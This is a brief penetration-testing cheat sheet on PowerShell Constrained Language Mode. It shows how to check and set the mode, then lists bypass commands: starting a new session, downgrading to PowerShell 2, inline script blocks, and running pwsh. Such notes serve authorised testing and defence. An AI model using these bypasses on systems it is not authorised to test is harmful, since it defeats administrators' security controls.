# Powershell Constrained Language Mode (CLM) Bypass

https://viperone.gitbook.io/pentest-everything/everything/powershell/constrained-language-mode


Constrained Language Mode is a setting in PowerShell that greatly limits what commands can be performed. This can potentially reduce the available attack surface to adversary's.

By default PowerShell runs in Full Language Mode which all functions are available for use. This includes access to all language elements, cmdlets, and modules, as well as the file system and the network.

## Enumeration

##### Check current language mode

    $ExecutionContext.SessionState.LanguageMode

##### Simple command to see if Constrained Language is enabled in current session

    [System.Console]::WriteLine("ConstrainedModeTest")

Constrained Language mode can be set with the following commands.

##### Set Language mode to Constrained (Current Session)

    $ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"

##### Environmental Variable, all new sessions will start in Constrained Mode

    [Environment]::SetEnvironmentVariable(‘__PSLockdownPolicy‘, ‘4’, ‘Machine‘)

## Bypass

##### Bypass by starting new PS session

    powershell.exe

##### Bypass by downgrading version to PowerShell 2

    Powershell.exe -version 2

##### Attempt command execution with inline functions

    &{hostname}

##### If PowerShell V6 is installed try executing

    pwsh

## TIP: Constrained Language mode is often enabled in environments that enforce AppLocker

## TIP 2: Constrained Language mode was introduced in PowerShell version 3. As such it is not applicable to version 2 PowerShell sessions.

